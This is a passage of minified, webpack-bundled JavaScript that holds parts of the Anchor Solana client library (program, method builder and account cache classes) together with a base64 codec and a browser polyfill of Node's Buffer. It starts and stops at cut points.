                        return n.writeUInt16LE(t), n;
                    case "u32":
                        let r = Buffer.alloc(4);
                        return r.writeUInt32LE(t), r;
                    case "u64":
                        let i = Buffer.alloc(8);
                        return i.writeBigUInt64LE(BigInt(t)), i;
                    case "string":
                        return Buffer.from(fo(t));
                    case "publicKey":
                        return t.toBuffer();
                    default:
                        if (e.array) return Buffer.from(t);
                        throw new Error(`Unexpected seed type: ${e}`)
                }
            }
        }
        class Ko {
            constructor(e, t) {
                this._provider = e, this._accounts = t, this._cache = new Map
            }
            async fetchAccount(e, t) {
                const n = t.toString();
                if (void 0 === this._cache.get(n))
                    if ("TokenAccount" === e) {
                        const e = await this._provider.connection.getAccountInfo(t);
                        if (null === e) throw new Error(`invalid account info for ${n}`);
                        const r = Fo().accounts.decode("Token", e.data);
                        this._cache.set(n, r)
                    } else {
                        const r = this._accounts[ke()(e)].fetch(t);
                        this._cache.set(n, r)
                    }
                return this._cache.get(n)
            }
        }
        class qo {
            constructor(e, t, n, r, i, o, s, a, u) {
                this._args = e, this._ixFn = t, this._txFn = n, this._rpcFn = r, this._simulateFn = i, this._accounts = {}, this._remainingAccounts = [], this._signers = [], this._preInstructions = [], this._postInstructions = [], this._accountsResolver = new Wo(e, this._accounts, o, s, a, u)
            }
            accounts(e) {
                return Object.assign(this._accounts, e), this
            }
            signers(e) {
                return this._signers = this._signers.concat(e), this
            }
            remainingAccounts(e) {
                return this._remainingAccounts = this._remainingAccounts.concat(e), this
            }
            preInstructions(e) {
                return this._preInstructions = this._preInstructions.concat(e), this
            }
            postInstructions(e) {
                return this._postInstructions = this._postInstructions.concat(e), this
            }
            async rpc(e) {
                return await this._accountsResolver.resolve(), this._rpcFn(...this._args, {
                    accounts: this._accounts,
                    signers: this._signers,
                    remainingAccounts: this._remainingAccounts,
                    preInstructions: this._preInstructions,
                    postInstructions: this._postInstructions,
                    options: e
                })
            }
            async simulate(e) {
                return await this._accountsResolver.resolve(), this._simulateFn(...this._args, {
                    accounts: this._accounts,
                    signers: this._signers,
                    remainingAccounts: this._remainingAccounts,
                    preInstructions: this._preInstructions,
                    postInstructions: this._postInstructions,
                    options: e
                })
            }
            async instruction() {
                return await this._accountsResolver.resolve(), this._ixFn(...this._args, {
                    accounts: this._accounts,
                    signers: this._signers,
                    remainingAccounts: this._remainingAccounts,
                    preInstructions: this._preInstructions,
                    postInstructions: this._postInstructions
                })
            }
            async transaction() {
                return await this._accountsResolver.resolve(), this._txFn(...this._args, {
                    accounts: this._accounts,
                    signers: this._signers,
                    remainingAccounts: this._remainingAccounts,
                    preInstructions: this._preInstructions,
                    postInstructions: this._postInstructions
                })
            }
        }
        class Vo {
            constructor(e, t, n, r) {
                t = $i(t), n || (n = Dr()), this._idl = e, this._provider = n, this._programId = t, this._coder = null != r ? r : new ci(e), this._events = new Do(this._programId, n, this._coder);
                const [i, o, s, a, u, c, l] = class {
                    static build(e, t, n, r) {
                        const i = {},
                            o = {},
                            s = {},
                            a = {},
                            u = {},
                            c = Zi(e),
                            l = e.accounts ? class {
                                static build(e, t, n, r) {
                                    var i;
                                    const o = {};
                                    return null === (i = e.accounts) || void 0 === i || i.forEach((i => {
                                        const s = ke()(i.name);
                                        o[s] = new Lo(e, i, n, r, t)
                                    })), o
                                }
                            }.build(e, t, n, r) : {},
                            f = class {
                                static build(e, t, n, r) {
                                    if (void 0 !== e.state) return new Co(e, n, r, t)
                                }
                            }.build(e, t, n, r);
                        return e.instructions.forEach((f => {
                            const h = Bo.build(f, ((e, n) => t.instruction.encode(e, n)), n),
                                d = Oo.build(f, h),
                                p = To.build(f, d, c, r),
                                y = class {
                                    static build(e, t, n, r, i, o, s) {
                                        return async function() {
                                            for (var a = arguments.length, u = new Array(a), c = 0; c < a; c++) u[c] = arguments[c];
                                            const l = t(...u),
                                                [, f] = Mo(e, [...u]);
                                            let h;
                                            try {
                                                h = await r.simulate(l, f.signers, f.options)
                                            } catch (e) {
                                                oi("debug-logs") && console.log("Translating error:", e);
                                                let r = jr.parse(e, n);
                                                if (null === r) throw e;
                                                throw r
                                            }
                                            if (void 0 === h) throw new Error("Unable to simulate transaction");
                                            if (h.value.err) throw new Error(`Simulate error: ${h.value.err.toString()}`);
                                            const d = h.value.logs;
                                            if (!d) throw new Error("Simulated logs not found");
                                            const p = [];
                                            return s.events && new zo(o, i).parseLogs(d, (e => {
                                                p.push(e)
                                            })), {
                                                events: p,
                                                raw: d
                                            }
                                        }
                                    }
                                }.build(f, d, c, r, t, n, e),
                                g = class {
                                    static build(e, t, n, r, i, o, s, a) {
                                        return function() {
                                            for (var u = arguments.length, c = new Array(u), l = 0; l < u; l++) c[l] = arguments[l];
                                            return new qo(c, r, i, o, s, e, t, n, a)
                                        }
                                    }
                                }.build(r, n, f, h, d, p, y, l),
                                m = ke()(f.name);
                            o[m] = h, s[m] = d, i[m] = p, a[m] = y, u[m] = g
                        })), [i, o, s, l, a, u, f]
                    }
                }.build(e, this._coder, t, n);
                this.rpc = i, this.instruction = o, this.transaction = s, this.account = a, this.simulate = u, this.methods = c, this.state = l
            }
            get programId() {
                return this._programId
            }
            get idl() {
                return this._idl
            }
            get coder() {
                return this._coder
            }
            get provider() {
                return this._provider
            }
            static async at(e, t) {
                const n = $i(e),
                    r = await Vo.fetchIdl(n, t);
                if (!r) throw new Error(`IDL not found for program: ${e.toString()}`);
                return new Vo(r, n, t)
            }
            static async fetchIdl(e, t) {
                t = null != t ? t : Dr();
                const n = $i(e),
                    r = await async function(e) {
                        const t = (await _.PublicKey.findProgramAddress([], e))[0];
                        return await _.PublicKey.createWithSeed(t, "anchor:idl", e)
                    }(n),
                    i = await t.connection.getAccountInfo(r);
                if (!i) return null;
                let o = (s = i.data.slice(8), xo.decode(s));
                var s;
                const a = Nr(o.data);
                return JSON.parse(lo(a))
            }
            addEventListener(e, t) {
                return this._events.addEventListener(e, t)
            }
            async removeEventListener(e) {
                return await this._events.removeEventListener(e)
            }
        }
        for (var Qo = __webpack_require__(4942), Go = {}, Yo = {
                byteLength: function(e) {
                    var t = ns(e),
                        n = t[0],
                        r = t[1];
                    return 3 * (n + r) / 4 - r
                },
                toByteArray: function(e) {
                    var t, n, r = ns(e),
                        i = r[0],
                        o = r[1],
                        s = new Xo(function(e, t, n) {
                            return 3 * (t + n) / 4 - n
                        }(0, i, o)),
                        a = 0,
                        u = o > 0 ? i - 4 : i;
                    for (n = 0; n < u; n += 4) t = Jo[e.charCodeAt(n)] << 18 | Jo[e.charCodeAt(n + 1)] << 12 | Jo[e.charCodeAt(n + 2)] << 6 | Jo[e.charCodeAt(n + 3)], s[a++] = t >> 16 & 255, s[a++] = t >> 8 & 255, s[a++] = 255 & t;
                    2 === o && (t = Jo[e.charCodeAt(n)] << 2 | Jo[e.charCodeAt(n + 1)] >> 4, s[a++] = 255 & t);
                    1 === o && (t = Jo[e.charCodeAt(n)] << 10 | Jo[e.charCodeAt(n + 1)] << 4 | Jo[e.charCodeAt(n + 2)] >> 2, s[a++] = t >> 8 & 255, s[a++] = 255 & t);
                    return s
                },
                fromByteArray: function(e) {
                    for (var t, n = e.length, r = n % 3, i = [], o = 16383, s = 0, a = n - r; s < a; s += o) i.push(rs(e, s, s + o > a ? a : s + o));
                    1 === r ? (t = e[n - 1], i.push(Zo[t >> 2] + Zo[t << 4 & 63] + "==")) : 2 === r && (t = (e[n - 2] << 8) + e[n - 1], i.push(Zo[t >> 10] + Zo[t >> 4 & 63] + Zo[t << 2 & 63] + "="));
                    return i.join("")
                }
            }, Zo = [], Jo = [], Xo = "undefined" !== typeof Uint8Array ? Uint8Array : Array, $o = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", es = 0, ts = $o.length; es < ts; ++es) Zo[es] = $o[es], Jo[$o.charCodeAt(es)] = es;

        function ns(e) {
            var t = e.length;
            if (t % 4 > 0) throw new Error("Invalid string. Length must be a multiple of 4");
            var n = e.indexOf("=");
            return -1 === n && (n = t), [n, n === t ? 0 : 4 - n % 4]
        }

        function rs(e, t, n) {
            for (var r, i, o = [], s = t; s < n; s += 3) r = (e[s] << 16 & 16711680) + (e[s + 1] << 8 & 65280) + (255 & e[s + 2]), o.push(Zo[(i = r) >> 18 & 63] + Zo[i >> 12 & 63] + Zo[i >> 6 & 63] + Zo[63 & i]);
            return o.join("")
        }
        Jo["-".charCodeAt(0)] = 62, Jo["_".charCodeAt(0)] = 63;
        var is = {
            read: function(e, t, n, r, i) {
                var o, s, a = 8 * i - r - 1,
                    u = (1 << a) - 1,
                    c = u >> 1,
                    l = -7,
                    f = n ? i - 1 : 0,
                    h = n ? -1 : 1,
                    d = e[t + f];
                for (f += h, o = d & (1 << -l) - 1, d >>= -l, l += a; l > 0; o = 256 * o + e[t + f], f += h, l -= 8);
                for (s = o & (1 << -l) - 1, o >>= -l, l += r; l > 0; s = 256 * s + e[t + f], f += h, l -= 8);
                if (0 === o) o = 1 - c;
                else {
                    if (o === u) return s ? NaN : 1 / 0 * (d ? -1 : 1);
                    s += Math.pow(2, r), o -= c
                }
                return (d ? -1 : 1) * s * Math.pow(2, o - r)
            },
            write: function(e, t, n, r, i, o) {
                var s, a, u, c = 8 * o - i - 1,
                    l = (1 << c) - 1,
                    f = l >> 1,
                    h = 23 === i ? Math.pow(2, -24) - Math.pow(2, -77) : 0,
                    d = r ? 0 : o - 1,
                    p = r ? 1 : -1,
                    y = t < 0 || 0 === t && 1 / t < 0 ? 1 : 0;
                for (t = Math.abs(t), isNaN(t) || t === 1 / 0 ? (a = isNaN(t) ? 1 : 0, s = l) : (s = Math.floor(Math.log(t) / Math.LN2), t * (u = Math.pow(2, -s)) < 1 && (s--, u *= 2), (t += s + f >= 1 ? h / u : h * Math.pow(2, 1 - f)) * u >= 2 && (s++, u /= 2), s + f >= l ? (a = 0, s = l) : s + f >= 1 ? (a = (t * u - 1) * Math.pow(2, i), s += f) : (a = t * Math.pow(2, f - 1) * Math.pow(2, i), s = 0)); i >= 8; e[n + d] = 255 & a, d += p, a /= 256, i -= 8);
                for (s = s << i | a, c += i; c > 0; e[n + d] = 255 & s, d += p, s /= 256, c -= 8);
                e[n + d - p] |= 128 * y
            }
        };
        ! function(e) {
            const t = Yo,
                n = is,
                r = "function" === typeof Symbol && "function" === typeof Symbol.for ? Symbol.for("nodejs.util.inspect.custom") : null;
            e.Buffer = s, e.SlowBuffer = function(e) {
                +e != e && (e = 0);
                return s.alloc(+e)
            }, e.INSPECT_MAX_BYTES = 50;
            const i = 2147483647;

            function o(e) {
                if (e > i) throw new RangeError('The value "' + e + '" is invalid for option "size"');
                const t = new Uint8Array(e);
                return Object.setPrototypeOf(t, s.prototype), t
            }

            function s(e, t, n) {
                if ("number" === typeof e) {
                    if ("string" === typeof t) throw new TypeError('The "string" argument must be of type string. Received type number');
                    return c(e)
                }
                return a(e, t, n)
            }

            function a(e, t, n) {
                if ("string" === typeof e) return function(e, t) {
                    "string" === typeof t && "" !== t || (t = "utf8");
                    if (!s.isEncoding(t)) throw new TypeError("Unknown encoding: " + t);
                    const n = 0 | d(e, t);
                    let r = o(n);
                    const i = r.write(e, t);
                    i !== n && (r = r.slice(0, i));
                    return r
                }(e, t);
                if (ArrayBuffer.isView(e)) return function(e) {
                    if (Q(e, Uint8Array)) {
                        const t = new Uint8Array(e);
                        return f(t.buffer, t.byteOffset, t.byteLength)
                    }
                    return l(e)
                }(e);
                if (null == e) throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof e);
                if (Q(e, ArrayBuffer) || e && Q(e.buffer, ArrayBuffer)) return f(e, t, n);
                if ("undefined" !== typeof SharedArrayBuffer && (Q(e, SharedArrayBuffer) || e && Q(e.buffer, SharedArrayBuffer))) return f(e, t, n);
                if ("number" === typeof e) throw new TypeError('The "value" argument must not be of type number. Received type number');
                const r = e.valueOf && e.valueOf();
                if (null != r && r !== e) return s.from(r, t, n);
                const i = function(e) {
                    if (s.isBuffer(e)) {
                        const t = 0 | h(e.length),
                            n = o(t);
                        return 0 === n.length || e.copy(n, 0, 0, t), n
                    }
                    if (void 0 !== e.length) return "number" !== typeof e.length || G(e.length) ? o(0) : l(e);
                    if ("Buffer" === e.type && Array.isArray(e.data)) return l(e.data)
                }(e);
                if (i) return i;
                if ("undefined" !== typeof Symbol && null != Symbol.toPrimitive && "function" === typeof e[Symbol.toPrimitive]) return s.from(e[Symbol.toPrimitive]("string"), t, n);
                throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof e)
            }

            function u(e) {
                if ("number" !== typeof e) throw new TypeError('"size" argument must be of type number');
                if (e < 0) throw new RangeError('The value "' + e + '" is invalid for option "size"')
            }

            function c(e) {
                return u(e), o(e < 0 ? 0 : 0 | h(e))
            }

            function l(e) {
                const t = e.length < 0 ? 0 : 0 | h(e.length),
                    n = o(t);
                for (let r = 0; r < t; r += 1) n[r] = 255 & e[r];
                return n
            }

            function f(e, t, n) {
                if (t < 0 || e.byteLength < t) throw new RangeError('"offset" is outside of buffer bounds');
                if (e.byteLength < t + (n || 0)) throw new RangeError('"length" is outside of buffer bounds');
                let r;
                return r = void 0 === t && void 0 === n ? new Uint8Array(e) : void 0 === n ? new Uint8Array(e, t) : new Uint8Array(e, t, n), Object.setPrototypeOf(r, s.prototype), r
            }

            function h(e) {
                if (e >= i) throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + i.toString(16) + " bytes");
                return 0 | e
            }

            function d(e, t) {
                if (s.isBuffer(e)) return e.length;
                if (ArrayBuffer.isView(e) || Q(e, ArrayBuffer)) return e.byteLength;
                if ("string" !== typeof e) throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' + typeof e);
                const n = e.length,
                    r = arguments.length > 2 && !0 === arguments[2];
                if (!r && 0 === n) return 0;
                let i = !1;
                for (;;) switch (t) {
                    case "ascii":
                    case "latin1":
                    case "binary":
                        return n;
                    case "utf8":
                    case "utf-8":
                        return K(e).length;
                    case "ucs2":
                    case "ucs-2":
                    case "utf16le":
                    case "utf-16le":
                        return 2 * n;
                    case "hex":
                        return n >>> 1;
                    case "base64":
                        return q(e).length;
                    default:
                        if (i) return r ? -1 : K(e).length;
                        t = ("" + t).toLowerCase(), i = !0
                }
            }

            function p(e, t, n) {
                let r = !1;
                if ((void 0 === t || t < 0) && (t = 0), t > this.length) return "";
                if ((void 0 === n || n > this.length) && (n = this.length), n <= 0) return "";
                if ((n >>>= 0) <= (t >>>= 0)) return "";
                for (e || (e = "utf8");;) switch (e) {
                    case "hex":
                        return M(this, t, n);
                    case "utf8":
                    case "utf-8":
                        return E(this, t, n);
                    case "ascii":
                        return I(this, t, n);
                    case "latin1":
                    case "binary":
                        return x(this, t, n);
                    case "base64":
                        return _(this, t, n);
                    case "ucs2":
                    case "ucs-2":
                    case "utf16le":
                    case "utf-16le":
                        return B(this, t, n);
                    default:
                        if (r) throw new TypeError("Unknown encoding: " + e);
                        e = (e + "").toLowerCase(), r = !0
                }
            }

            function y(e, t, n) {
                const r = e[t];
                e[t] = e[n], e[n] = r
            }

            function g(e, t, n, r, i) {
                if (0 === e.length) return -1;
                if ("string" === typeof n ? (r = n, n = 0) : n > 2147483647 ? n = 2147483647 : n < -2147483648 && (n = -2147483648), G(n = +n) && (n = i ? 0 : e.length - 1), n < 0 && (n = e.length + n), n >= e.length) {
                    if (i) return -1;
                    n = e.length - 1
                } else if (n < 0) {
                    if (!i) return -1;
                    n = 0
                }
                if ("string" === typeof t && (t = s.from(t, r)), s.isBuffer(t)) return 0 === t.length ? -1 : m(e, t, n, r, i);
                if ("number" === typeof t) return t &= 255, "function" === typeof Uint8Array.prototype.indexOf ? i ? Uint8Array.prototype.indexOf.call(e, t, n) : Uint8Array.prototype.lastIndexOf.call(e, t, n) : m(e, [t], n, r, i);
                throw new TypeError("val must be string, number or Buffer")
            }

            function m(e, t, n, r, i) {
                let o, s = 1,
                    a = e.length,
                    u = t.length;
                if (void 0 !== r && ("ucs2" === (r = String(r).toLowerCase()) || "ucs-2" === r || "utf16le" === r || "utf-16le" === r)) {
                    if (e.length < 2 || t.length < 2) return -1;
                    s = 2, a /= 2, u /= 2, n /= 2
                }

                function c(e, t) {
                    return 1 === s ? e[t] : e.readUInt16BE(t * s)
                }
                if (i) {
                    let r = -1;
                    for (o = n; o < a; o++)
                        if (c(e, o) === c(t, -1 === r ? 0 : o - r)) {
                            if (-1 === r && (r = o), o - r + 1 === u) return r * s
                        } else -1 !== r && (o -= o - r), r = -1
                } else
                    for (n + u > a && (n = a - u), o = n; o >= 0; o--) {
                        let n = !0;
                        for (let r = 0; r < u; r++)
                            if (c(e, o + r) !== c(t, r)) {
                                n = !1;
                                break
                            }
                        if (n) return o
                    }
                return -1
            }

            function w(e, t, n, r) {
                n = Number(n) || 0;
                const i = e.length - n;
                r ? (r = Number(r)) > i && (r = i) : r = i;
                const o = t.length;
                let s;
                for (r > o / 2 && (r = o / 2), s = 0; s < r; ++s) {
                    const r = parseInt(t.substr(2 * s, 2), 16);
                    if (G(r)) return s;
                    e[n + s] = r
                }
                return s
            }

            function b(e, t, n, r) {
                return V(K(t, e.length - n), e, n, r)
            }

            function v(e, t, n, r) {
                return V(function(e) {
                    const t = [];
                    for (let n = 0; n < e.length; ++n) t.push(255 & e.charCodeAt(n));
                    return t
                }(t), e, n, r)
            }

            function A(e, t, n, r) {
                return V(q(t), e, n, r)
            }

            function k(e, t, n, r) {
                return V(function(e, t) {
                    let n, r, i;
                    const o = [];
                    for (let s = 0; s < e.length && !((t -= 2) < 0); ++s) n = e.charCodeAt(s), r = n >> 8, i = n % 256, o.push(i), o.push(r);
                    return o
                }(t, e.length - n), e, n, r)
            }

            function _(e, n, r) {
                return 0 === n && r === e.length ? t.fromByteArray(e) : t.fromByteArray(e.slice(n, r))
            }

            function E(e, t, n) {
                n = Math.min(e.length, n);
                const r = [];
                let i = t;
                for (; i < n;) {
                    const t = e[i];
                    let o = null,
                        s = t > 239 ? 4 : t > 223 ? 3 : t > 191 ? 2 : 1;
                    if (i + s <= n) {
                        let n, r, a, u;
                        switch (s) {
                            case 1:
                                t < 128 && (o = t);
                                break;
                            case 2:
                                n = e[i + 1], 128 === (192 & n) && (u = (31 & t) << 6 | 63 & n, u > 127 && (o = u));
                                break;
                            case 3:
                                n = e[i + 1], r = e[i + 2], 128 === (192 & n) && 128 === (192 & r) && (u = (15 & t) << 12 | (63 & n) << 6 | 63 & r, u > 2047 && (u < 55296 || u > 57343) && (o = u));
                                break;
                            case 4:
                                n = e[i + 1], r = e[i + 2], a = e[i + 3], 128 === (192 & n) && 128 === (192 & r) && 128 === (192 & a) && (u = (15 & t) << 18 | (63 & n) << 12 | (63 & r) << 6 | 63 & a, u > 65535 && u < 1114112 && (o = u))
                        }
                    }
                    null === o ? (o = 65533, s = 1) : o > 65535 && (o -= 65536, r.push(o >>> 10 & 1023 | 55296), o = 56320 | 1023 & o), r.push(o), i += s
                }
                return function(e) {
                    const t = e.length;
                    if (t <= S) return String.fromCharCode.apply(String, e);
                    let n = "",
                        r = 0;
                    for (; r < t;) n += String.fromCharCode.apply(String, e.slice(r, r += S));
                    return n
                }(r)
            }
            e.kMaxLength = i, s.TYPED_ARRAY_SUPPORT = function() {
                try {
                    const e = new Uint8Array(1),
                        t = {
                            foo: function() {
                                return 42
                            }
                        };
                    return Object.setPrototypeOf(t, Uint8Array.prototype), Object.setPrototypeOf(e, t), 42 === e.foo()
                } catch (e) {
                    return !1
                }
            }(), s.TYPED_ARRAY_SUPPORT || "undefined" === typeof console || "function" !== typeof console.error || console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support."), Object.defineProperty(s.prototype, "parent", {
                enumerable: !0,
                get: function() {
                    if (s.isBuffer(this)) return this.buffer
                }
            }), Object.defineProperty(s.prototype, "offset", {
                enumerable: !0,
                get: function() {
                    if (s.isBuffer(this)) return this.byteOffset
                }
            }), s.poolSize = 8192, s.from = function(e, t, n) {
                return a(e, t, n)
            }, Object.setPrototypeOf(s.prototype, Uint8Array.prototype), Object.setPrototypeOf(s, Uint8Array), s.alloc = function(e, t, n) {
                return function(e, t, n) {
                    return u(e), e <= 0 ? o(e) : void 0 !== t ? "string" === typeof n ? o(e).fill(t, n) : o(e).fill(t) : o(e)
                }(e, t, n)
            }, s.allocUnsafe = function(e) {
                return c(e)
            }, s.allocUnsafeSlow = function(e) {
                return c(e)
            }, s.isBuffer = function(e) {
                return null != e && !0 === e._isBuffer && e !== s.prototype
            }, s.compare = function(e, t) {
                if (Q(e, Uint8Array) && (e = s.from(e, e.offset, e.byteLength)), Q(t, Uint8Array) && (t = s.from(t, t.offset, t.byteLength)), !s.isBuffer(e) || !s.isBuffer(t)) throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');
                if (e === t) return 0;
                let n = e.length,
                    r = t.length;
                for (let i = 0, o = Math.min(n, r); i < o; ++i)
                    if (e[i] !== t[i]) {
                        n = e[i], r = t[i];
                        break
                    }
                return n < r ? -1 : r < n ? 1 : 0
            }, s.isEncoding = function(e) {
                switch (String(e).toLowerCase()) {
                    case "hex":
                    case "utf8":
                    case "utf-8":
                    case "ascii":
                    case "latin1":
                    case "binary":
                    case "base64":
                    case "ucs2":
                    case "ucs-2":
                    case "utf16le":
                    case "utf-16le":
                        return !0;
                    default:
                        return !1
                }
            }, s.concat = function(e, t) {
                if (!Array.isArray(e)) throw new TypeError('"list" argument must be an Array of Buffers');
                if (0 === e.length) return s.alloc(0);
                let n;
                if (void 0 === t)
                    for (t = 0, n = 0; n < e.length; ++n) t += e[n].length;
                const r = s.allocUnsafe(t);
                let i = 0;
                for (n = 0; n < e.length; ++n) {
                    let t = e[n];
                    if (Q(t, Uint8Array)) i + t.length > r.length ? (s.isBuffer(t) || (t = s.from(t)), t.copy(r, i)) : Uint8Array.prototype.set.call(r, t, i);
                    else {
                        if (!s.isBuffer(t)) throw new TypeError('"list" argument must be an Array of Buffers');
                        t.copy(r, i)
                    }
                    i += t.length
                }
                return r
            }, s.byteLength = d, s.prototype._isBuffer = !0, s.prototype.swap16 = function() {
                const e = this.length;
                if (e % 2 !== 0) throw new RangeError("Buffer size must be a multiple of 16-bits");
                for (let t = 0; t < e; t += 2) y(this, t, t + 1);
                return this
            }, s.prototype.swap32 = function() {
                const e = this.length;
                if (e % 4 !== 0) throw new RangeError("Buffer size must be a multiple of 32-bits");
                for (let t = 0; t < e; t += 4) y(this, t, t + 3), y(this, t + 1, t + 2);
                return this
            }, s.prototype.swap64 = function() {
                const e = this.length;
                if (e % 8 !== 0) throw new RangeError("Buffer size must be a multiple of 64-bits");
                for (let t = 0; t < e; t += 8) y(this, t, t + 7), y(this, t + 1, t + 6), y(this, t + 2, t + 5), y(this, t + 3, t + 4);
                return this
            }, s.prototype.toString = function() {
                const e = this.length;
                return 0 === e ? "" : 0 === arguments.length ? E(this, 0, e) : p.apply(this, arguments)
            }, s.prototype.toLocaleString = s.prototype.toString, s.prototype.equals = function(e) {
                if (!s.isBuffer(e)) throw new TypeError("Argument must be a Buffer");
                return this === e || 0 === s.compare(this, e)
            }, s.prototype.inspect = function() {
                let t = "";
                const n = e.INSPECT_MAX_BYTES;
                return t = this.toString("hex", 0, n).replace(/(.{2})/g, "$1 ").trim(), this.length > n && (t += " ... "), "<Buffer " + t + ">"
            }, r && (s.prototype[r] = s.prototype.inspect), s.prototype.compare = function(e, t, n, r, i) {
                if (Q(e, Uint8Array) && (e = s.from(e, e.offset, e.byteLength)), !s.isBuffer(e)) throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type ' + typeof e);
                if (void 0 === t && (t = 0), void 0 === n && (n = e ? e.length : 0), void 0 === r && (r = 0), void 0 === i && (i = this.length), t < 0 || n > e.length || r < 0 || i > this.length) throw new RangeError("out of range index");
                if (r >= i && t >= n) return 0;
                if (r >= i) return -1;
                if (t >= n) return 1;
                if (this === e) return 0;
                let o = (i >>>= 0) - (r >>>= 0),
                    a = (n >>>= 0) - (t >>>= 0);
                const u = Math.min(o, a),
                    c = this.slice(r, i),
                    l = e.slice(t, n);
                for (let s = 0; s < u; ++s)
                    if (c[s] !== l[s]) {
                        o = c[s], a = l[s];
                        break
                    }
                return o < a ? -1 : a < o ? 1 : 0
            }, s.prototype.includes = function(e, t, n) {
                return -1 !== this.indexOf(e, t, n)
            }, s.prototype.indexOf = function(e, t, n) {
                return g(this, e, t, n, !0)
            }, s.prototype.lastIndexOf = function(e, t, n) {
                return g(this, e, t, n, !1)
            }, s.prototype.write = function(e, t, n, r) {
                if (void 0 === t) r = "utf8", n = this.length, t = 0;
                else if (void 0 === n && "string" === typeof t) r = t, n = this.length, t = 0;
                else {
                    if (!isFinite(t)) throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
                    t >>>= 0, isFinite(n) ? (n >>>= 0, void 0 === r && (r = "utf8")) : (r = n, n = void 0)
                }
                const i = this.length - t;
                if ((void 0 === n || n > i) && (n = i), e.length > 0 && (n < 0 || t < 0) || t > this.length) throw new RangeError("Attempt to write outside buffer bounds");
                r || (r = "utf8");
                let o = !1;
                for (;;) switch (r) {
                    case "hex":
                        return w(this, e, t, n);
                    case "utf8":
                    case "utf-8":
                        return b(this, e, t, n);
                    case "ascii":
                    case "latin1":
                    case "binary":
                        return v(this, e, t, n);
                    case "base64":
                        return A(this, e, t, n);
                    case "ucs2":
                    case "ucs-2":
                    case "utf16le":
                    case "utf-16le":
                        return k(this, e, t, n);
                    default:
                        if (o) throw new TypeError("Unknown encoding: " + r);
                        r = ("" + r).toLowerCase(), o = !0
                }
            }, s.prototype.toJSON = function() {
                return {
                    type: "Buffer",
                    data: Array.prototype.slice.call(this._arr || this, 0)
                }
            };
            const S = 4096;

            function I(e, t, n) {
                let r = "";
                n = Math.min(e.length, n);
                for (let i = t; i < n; ++i) r += String.fromCharCode(127 & e[i]);
                return r
            }

            function x(e, t, n) {
                let r = "";
                n = Math.min(e.length, n);
                for (let i = t; i < n; ++i) r += String.fromCharCode(e[i]);
                return r
            }

            function M(e, t, n) {
                const r = e.length;
                (!t || t < 0) && (t = 0), (!n || n < 0 || n > r) && (n = r);
                let i = "";
                for (let o = t; o < n; ++o) i += Y[e[o]];
                return i
            }

            function B(e, t, n) {
                const r = e.slice(t, n);
                let i = "";
                for (let o = 0; o < r.length - 1; o += 2) i += String.fromCharCode(r[o] + 256 * r[o + 1]);
                return i
            }

            function T(e, t, n) {
                if (e % 1 !== 0 || e < 0) throw new RangeError("offset is not uint");
                if (e + t > n) throw new RangeError("Trying to access beyond buffer length")
            }

            function O(e, t, n, r, i, o) {
                if (!s.isBuffer(e)) throw new TypeError('"buffer" argument must be a Buffer instance');
                if (t > i || t < o) throw new RangeError('"value" argument is out of bounds');
                if (n + r > e.length) throw new RangeError("Index out of range")
            }

            function C(e, t, n, r, i) {
                j(t, r, i, e, n, 7);
                let o = Number(t & BigInt(4294967295));
                e[n++] = o, o >>= 8, e[n++] = o, o >>= 8, e[n++] = o, o >>= 8, e[n++] = o;
                let s = Number(t >> BigInt(32) & BigInt(4294967295));
                return e[n++] = s, s >>= 8, e[n++] = s, s >>= 8, e[n++] = s, s >>= 8, e[n++] = s, n
            }

            function P(e, t, n, r, i) {
                j(t, r, i, e, n, 7);
                let o = Number(t & BigInt(4294967295));
                e[n + 7] = o, o >>= 8, e[n + 6] = o, o >>= 8, e[n + 5] = o, o >>= 8, e[n + 4] = o;
                let s = Number(t >> BigInt(32) & BigInt(4294967295));
                return e[n + 3] = s, s >>= 8, e[n + 2] = s, s >>= 8, e[n + 1] = s, s >>= 8, e[n] = s, n + 8
            }

            function L(e, t, n, r, i, o) {
                if (n + r > e.length) throw new RangeError("Index out of range");
                if (n < 0) throw new RangeError("Index out of range")
            }

            function N(e, t, r, i, o) {
                return t = +t, r >>>= 0, o || L(e, 0, r, 4), n.write(e, t, r, i, 23, 4), r + 4
            }

            function R(e, t, r, i, o) {
                return t = +t, r >>>= 0, o || L(e, 0, r, 8), n.write(e, t, r, i, 52, 8), r + 8
            }
            s.prototype.slice = function(e, t) {
                const n = this.length;
                (e = ~~e) < 0 ? (e += n) < 0 && (e = 0) : e > n && (e = n), (t = void 0 === t ? n : ~~t) < 0 ? (t += n) < 0 && (t = 0) : t > n && (t = n), t < e && (t = e);
                const r = this.subarray(e, t);
                return Object.setPrototypeOf(r, s.prototype), r
            }, s.prototype.readUintLE = s.prototype.readUIntLE = function(e, t, n) {
                e >>>= 0, t >>>= 0, n || T(e, t, this.length);
                let r = this[e],
                    i = 1,
                    o = 0;
                for (; ++o < t && (i *= 256);) r += this[e + o] * i;
                return r
            }, s.prototype.readUintBE = s.prototype.readUIntBE = function(e, t, n) {
                e >>>= 0, t >>>= 0, n || T(e, t, this.length);
                let r = this[e + --t],
                    i = 1;
                for (; t > 0 && (i *= 256);) r += this[e + --t] * i;
                return r
            }, s.prototype.readUint8 = s.prototype.readUInt8 = function(e, t) {
                return e >>>= 0, t || T(e, 1, this.length), this[e]
            }, s.prototype.readUint16LE = s.prototype.readUInt16LE = function(e, t) {
                return e >>>= 0, t || T(e, 2, this.length), this[e] | this[e + 1] << 8
            }, s.prototype.readUint16BE = s.prototype.readUInt16BE = function(e, t) {
                return e >>>= 0, t || T(e, 2, this.length), this[e] << 8 | this[e + 1]
            }, s.prototype.readUint32LE = s.prototype.readUInt32LE = function(e, t) {
                return e >>>= 0, t || T(e, 4, this.length), (this[e] | this[e + 1] << 8 | this[e + 2] << 16) + 16777216 * this[e + 3]
            }, s.prototype.readUint32BE = s.prototype.readUInt32BE = function(e, t) {
